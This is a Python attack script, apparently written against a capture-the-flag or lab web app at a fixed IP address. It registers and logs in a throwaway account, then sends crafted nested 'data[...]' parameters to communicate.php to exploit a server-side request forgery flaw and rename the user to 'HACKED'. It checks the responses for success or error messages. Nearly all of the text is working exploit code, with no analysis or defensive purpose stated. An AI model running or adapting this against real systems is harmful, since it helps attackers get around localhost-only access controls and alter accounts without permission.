#!/usr/bin/env python3
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Create session
session = requests.Session()
username = random_string()
password = random_string()

# Register
data = {'name': 'testuser', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)

# Login
data = {'username': username, 'password': password}
session.post(f"{TARGET}/login.php", data=data)

print(f"[*] Logged in as {username}:{password}")

# Get current name
resp = session.get(f"{TARGET}/")
print(f"[*] Current page length: {len(resp.text)}")
if "Yo," in resp.text:
    print(f"[*] Found greeting in page")

# Test SSRF to try to reach localhost
# The issue is that communicate.php expects $data to be an array
# In PHP, $_POST['data'] would be an array if we send data[key]=value
# But with requests, we need to send it properly

# Let's try sending it with the correct format
test_url = "http://motherland.com/"

print(f"\n[*] Testing SSRF with URL: {test_url}")

# Try sending data as nested parameters
payload = {
    'url': test_url,
    'data[action]': 'edit',
    'data[new_name]': 'HACKED'
}

resp = session.post(f"{TARGET}/communicate.php", data=payload, timeout=10)
print(f"[+] Status: {resp.status_code}")
print(f"[+] Response length: {len(resp.text)}")

# Check if we see any response from curl
if "Done!" in resp.text:
    print("[+] SUCCESS! Name was changed")
elif "Only localhost" in resp.text:
    print("[-] Request didn't come from localhost")
elif "cURL Error" in resp.text:
    print("[*] cURL error detected")
    # Print the error
    import re
    match = re.search(r'cURL Error: ([^<]+)', resp.text)
    if match:
        print(f"    Error: {match.group(1)}")

# Print response snippet
print(f"\n[*] Response preview:")
print(resp.text[:500])
